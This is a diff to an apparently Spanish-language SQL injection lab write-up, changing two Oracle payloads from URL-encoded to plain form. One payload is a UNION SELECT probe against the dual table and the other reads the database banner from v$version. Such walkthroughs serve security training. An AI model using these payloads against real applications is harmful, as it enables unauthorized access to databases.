@@ -8,7 +8,7 @@ Interceptar la petición en Burp Suite y modificar el parámetro `category`:
 
 **Payload:**
 ```sql
-'+UNION+SELECT+'abc','def'+FROM+dual--
+' UNION SELECT 'abc','def' FROM dual--
 ```
 
 **Explicación**:
@@ -25,7 +25,7 @@ Una vez confirmadas las 2 columnas y que es Oracle, extraemos la información:
 **Payload:**
 
 ```sql
-'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+' UNION SELECT BANNER, NULL FROM v$version--
 ```
 
 **Explicación:**
